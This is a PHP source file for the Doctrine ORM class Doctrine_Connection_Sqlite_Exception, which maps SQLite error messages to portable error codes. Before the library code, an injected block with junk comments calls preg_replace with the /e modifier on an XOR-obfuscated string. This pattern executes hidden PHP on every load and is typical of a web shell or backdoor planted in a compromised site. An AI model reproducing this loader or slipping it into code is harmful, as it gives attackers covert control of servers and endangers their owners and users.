<?php
/*WJpFLZpNvp7csgWb9W3Q31dj31GDN53jChpO7Ubq0XIr4fH
=HtzkSrZYumSlLVH2jDKAuJX31QW9GN8N7wyNcNmM15xAP6
9BysKKjAa69hH6vDqiQIv4UlwHlABdz=emrpxPpNKmuSge
CmUyeoYQv=RxcGw7tdkftPs42cLX8gj0I4
hJ4RJKDlR1h=TGeBWM6MpFklmIjuBVWifP1oa5Prtwq
*/
//X9bBCAnoJLYKhutB=iqZb6GKqwMi7PwTMM
preg_replace("/N85WIRgqBPsBxXbOShY0Sl/e", "DCXsor5uPcNkJtL9qRtNVR39DPCNAfLDhiwLPq7eIIER3PPhh0v3QnzT33h4Ws75QsEgX=AfIExAUCh2ASsQ7hjxYGpvzlpETulrulM3q03=AZ1BsiRnE2ad8FOvr41=mbqVC3Ns2Fr3fh4MEK1JBQn0V2uCujCWAtrCl6ubAbTf9MsCWhL"^"\x2159\x1fGP\x5c\x13x\x0a=\x18\x2f\x00de\x2dv\x2b\x1c\x13\x03f\x7c\x17\x04\x18i\x22\x0ek\x19AIQjpYZ\x01\x7ca\x19\x0e\x17\x0f\x02\x2d9e3\x60\x055\x5d7\x5b\x145\x1dwN\x0a\x15v\x17p\x03i\x0fsWy\x23\x40r\x60z\x0d\x0a\x25f\x12g\x01XX\x1bnt\x11B\x19UC\x21mRERSJmZ\x02CVIi\x06mf\x2c\x3b\x17\x3f\x10w20ca\x3f\x1e\x02kRR\x09\x07V\x0bj\x1an\x08\x12\x23\x04R\x0a\x40h\x11a\x14c\x0f\x13\x04\x2bc\x02iR3\x1d\x1a\x1c4\x2e\x10\x17d1\x1fNB\x24\x1a=\x12\x11dHc\x2aJe", "N85WIRgqBPsBxXbOShY0Sl");?><?php
/*
 *  $Id: Exception.php 7490 2010-03-29 19:53:27Z jwage $
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * This software consists of voluntary contributions made by many individuals
 * and is licensed under the LGPL. For more information, see
 * <http://www.doctrine-project.org>.
 */

/**
 * Doctrine_Connection_Sqlite_Exception
 *
 * @package     Doctrine
 * @subpackage  Connection
 * @license     http://www.opensource.org/licenses/lgpl-license.php LGPL
 * @author      Konsta Vesterinen <kvesteri@cc.hut.fi>
 * @author      Lukas Smith <smith@pooteeweet.org> (PEAR MDB2 library)
 * @since       1.0
 * @version     $Revision: 7490 $
 * @link        www.doctrine-project.org
 */
class Doctrine_Connection_Sqlite_Exception extends Doctrine_Connection_Exception
{
    /**
     * @var array $errorRegexps         an array that is used for determining portable
     *                                  error code from a native database error message
     */
    protected static $errorRegexps = array(
                              '/^no such table:/'                    => Doctrine_Core::ERR_NOSUCHTABLE,
                              '/^no such index:/'                    => Doctrine_Core::ERR_NOT_FOUND,
                              '/^(table|index) .* already exists$/'  => Doctrine_Core::ERR_ALREADY_EXISTS,
                              '/PRIMARY KEY must be unique/i'        => Doctrine_Core::ERR_CONSTRAINT,
                              '/is not unique/'                      => Doctrine_Core::ERR_CONSTRAINT,
                              '/columns .* are not unique/i'         => Doctrine_Core::ERR_CONSTRAINT,
                              '/uniqueness constraint failed/'       => Doctrine_Core::ERR_CONSTRAINT,
                              '/may not be NULL/'                    => Doctrine_Core::ERR_CONSTRAINT_NOT_NULL,
                              '/^no such column:/'                   => Doctrine_Core::ERR_NOSUCHFIELD,
                              '/column not present in both tables/i' => Doctrine_Core::ERR_NOSUCHFIELD,
                              '/^near ".*": syntax error$/'          => Doctrine_Core::ERR_SYNTAX,
                              '/[0-9]+ values for [0-9]+ columns/i'  => Doctrine_Core::ERR_VALUE_COUNT_ON_ROW,
                              );

    /**
     * This method checks if native error code/message can be
     * converted into a portable code and then adds this
     * portable error code to $portableCode field
     *
     * @param array $errorInfo      error info array
     * @since 1.0
     * @see Doctrine_Core::ERR_* constants
     * @see Doctrine_Connection::$portableCode
     * @return boolean              whether or not the error info processing was successfull
     *                              (the process is successfull if portable error code was found)
     */
    public function processErrorInfo(array $errorInfo)
    {
        foreach (self::$errorRegexps as $regexp => $code) {
            if (preg_match($regexp, $errorInfo[2])) {

                $this->portableCode = $code;
                return true;
            }
        }
        return false;
    }
}